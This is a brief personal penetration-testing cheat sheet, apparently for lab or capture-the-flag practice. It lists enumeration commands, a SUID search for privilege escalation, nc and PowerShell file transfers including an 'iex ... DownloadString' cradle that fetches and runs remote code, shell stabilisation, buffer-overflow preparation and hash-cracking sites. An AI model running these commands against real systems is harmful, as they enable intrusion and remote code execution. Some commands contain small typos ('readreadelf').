# Tips

LinuxEnum: 

find / -perm -4000 2>/dev/null   //SUID files  \n
uname -a                         //Posible Linux Kernel Exploit

WindowsEnum:
whoami /all
systeminfo


File Transfer:
nc:
nc -l -p 4445 > ovrflw
nc -w 5 10.10.14.18 4445 < /usr/local/bin/ovrflw

powershell:

iex(New-Object System.Net.WebClient).DownloadString('http://10.10.10.10:8000/file')
Invoke-WebRequest "http://10.10.10.10/file.exe" -OutFile "C:\Users\Public\file.exe"
Invoke-RestMethod "http://10.10.10.10/file.exe" -OutFile "C:\Users\Public\file.exe"

Interactive shell:

python3 -c "import pty;pty.spawn('/bin/bash')"
Ctrl+Z
stty raw -echo
fg

BufOverFlow:

ldd ovrflw | grep libc
readreadelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
readreadelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit 

Create pattern: /opt/metasploit-framework/tools/exploit/pattern_create.rb -l 100
Pattern Offset: /opt/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x0000000


Hashes decrypt:
https://cmd5.ru/
https://hashes.org/

Links:
https://book.hacktricks.xyz/    /////Cheat Sheet Pentesting all the thing
https://github.com/egre55/ultimate-file-transfer-list/blob/master/README.md    //////File Transfer Cheat Sheet
https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/   /////////SMB enumeration CheatSheet
https://tcm-sec.com/2019/05/25/buffer-overflows-made-easy/    //////////BuferOverFlow tutor
